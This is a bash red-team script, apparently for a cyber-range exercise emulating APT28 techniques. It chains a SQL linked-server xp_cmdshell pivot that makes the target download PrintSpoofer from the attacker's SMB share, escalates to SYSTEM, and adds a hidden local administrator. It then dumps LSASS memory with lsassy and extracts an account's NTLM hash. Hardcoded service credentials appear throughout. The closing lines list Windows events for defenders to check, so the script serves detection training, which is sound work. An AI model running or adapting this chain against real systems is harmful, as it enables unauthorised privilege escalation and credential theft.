#!/bin/bash
# ============================================================
# TTP3: PrintSpoofer Privilege Escalation + LSASS Credential Dump
# MITRE: T1134 — Access Token Manipulation
# MITRE: T1003.001 — OS Credential Dumping: LSASS Memory
# APT28 Ref: Token impersonation for privilege escalation
# ============================================================
# PURPOSE: Generates Event 4688 (PrintSpoofer, net.exe), Event 4720
#          (user created), Event 4732 (admin group modified) on SRV03-APP.
# RUN FROM: Kali (attacker machine)
# PREREQ: SQL linked server access from TTP2
# ============================================================

set -o pipefail
DOMAIN="cyberange.local"
TOOLS="/opt/redteam"
LOOT="$TOOLS/loot"
PRIVESC="$TOOLS/tools"
SRV02="${1:?Usage: $0 <SRV02-DB_FQDN> <SRV03-APP_FQDN>}"
SRV03="${2:?Usage: $0 <SRV02-DB_FQDN> <SRV03-APP_FQDN>}"
KALI_IP=$(ip -4 addr show | grep -oP '(?<=inet\s)\d+\.\d+\.\d+\.\d+' | grep -v '127.0.0.1' | head -1)

echo "[*] TTP3: PrintSpoofer PrivEsc + LSASS Dump — T1134 / T1003.001"
echo "[*] Pivot: $SRV02 → $SRV03"
echo "[*] Kali IP: $KALI_IP"

echo ""
echo "[*] Phase 1: Starting authenticated SMB server..."
pkill -f impacket-smbserver 2>/dev/null; sleep 1
impacket-smbserver -smb2support -username att -password att share "$PRIVESC/" &>/dev/null &
SMB_PID=$!
sleep 3

echo ""
echo "[*] Phase 2: Uploading PrintSpoofer via linked server xp_cmdshell..."
cat > "$TOOLS/ttp3_upload.sql" << SQLU
EXEC ('xp_cmdshell ''net use \\\\${KALI_IP}\\share /user:att att''') AT [SRV03-APP];
EXEC ('xp_cmdshell ''copy \\\\${KALI_IP}\\share\\PrintSpoofer64.exe C:\\Windows\\Temp\\PrintSpoofer64.exe /Y''') AT [SRV03-APP];
EXEC ('xp_cmdshell ''net use \\\\${KALI_IP}\\share /delete /y''') AT [SRV03-APP];
EXEC ('xp_cmdshell ''dir C:\\Windows\\Temp\\PrintSpoofer64.exe''') AT [SRV03-APP];
SQLU

impacket-mssqlclient "cyberange.local/svc_db:Db@ccess2025!@$SRV02" -windows-auth \
    -file "$TOOLS/ttp3_upload.sql" 2>&1 | tee "$LOOT/ttp3_upload.txt"
sleep 2

echo ""
echo "[*] Phase 3: PrintSpoofer → SYSTEM → create temp admin..."
cat > "$TOOLS/ttp3_privesc.sql" << 'SQLP'
EXEC ('xp_cmdshell ''C:\Windows\Temp\PrintSpoofer64.exe -i -c "whoami"''') AT [SRV03-APP];
EXEC ('xp_cmdshell ''C:\Windows\Temp\PrintSpoofer64.exe -i -c "net user tempadmin P@ss123! /add"''') AT [SRV03-APP];
EXEC ('xp_cmdshell ''C:\Windows\Temp\PrintSpoofer64.exe -i -c "net localgroup Administrators tempadmin /add"''') AT [SRV03-APP];
EXEC ('xp_cmdshell ''net localgroup Administrators''') AT [SRV03-APP];
SQLP

impacket-mssqlclient "cyberange.local/svc_db:Db@ccess2025!@$SRV02" -windows-auth \
    -file "$TOOLS/ttp3_privesc.sql" 2>&1 | tee "$LOOT/ttp3_privesc.txt"

kill $SMB_PID 2>/dev/null
sleep 3

echo ""
echo "[*] Phase 4: LSASS dump via nxc lsassy (tempadmin local auth)..."
nxc smb "$SRV03" -u 'tempadmin' -p 'P@ss123!' --local-auth -M lsassy 2>&1 | tee "$LOOT/ttp3_lsassy.txt"

SVC_APP_HASH=$(grep -i "svc_app" "$LOOT/ttp3_lsassy.txt" 2>/dev/null | grep -oP '[a-fA-F0-9]{32}' | head -1)
[ -n "$SVC_APP_HASH" ] && echo "[+] svc_app hash: $SVC_APP_HASH" && echo "$SVC_APP_HASH" > "$LOOT/ttp3_svc_app_hash.txt"

echo ""
echo "[+] TTP3 Complete."
echo "[+] Blue team: check SRV03-APP Security log for:"
echo "    - Event 4688 — PrintSpoofer64.exe process (parent: cmd.exe from sqlservr.exe)"
echo "    - Event 4688 — net.exe user add / localgroup add"
echo "    - Event 4720 — tempadmin user account created"
echo "    - Event 4732 — tempadmin added to Administrators"
echo "    - Sysmon Event 10 — process accessing LSASS (lsassy dump)"
echo "[+] Artifacts: $LOOT/ttp3_*"
